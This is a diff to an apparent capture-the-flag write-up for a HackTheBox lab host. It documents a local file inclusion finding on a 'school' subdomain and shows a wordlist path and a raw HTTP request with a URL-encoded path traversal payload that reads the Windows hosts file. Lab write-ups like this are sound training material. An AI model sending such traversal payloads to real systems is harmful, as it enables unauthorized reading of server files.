@@ -202,4 +202,20 @@ There is clearly some protection on this functionality when trying to get LFI
 # LFI in `school` subdomain
 After seeing the protections on the URL parameter i investigated further
 
-Ill use this wordlist here ot 
+Ill use this wordlist here to fuzz the parameter:
+
+/usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt
+
+```python
+GET /index.php?view=%2F%2F.%2FC%3A%2FWindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts HTTP/1.1
+Host: school.flight.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://school.flight.htb/index.php?view=home.html
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+After filtering the response length i found a file read vulnerability in the URL parameter
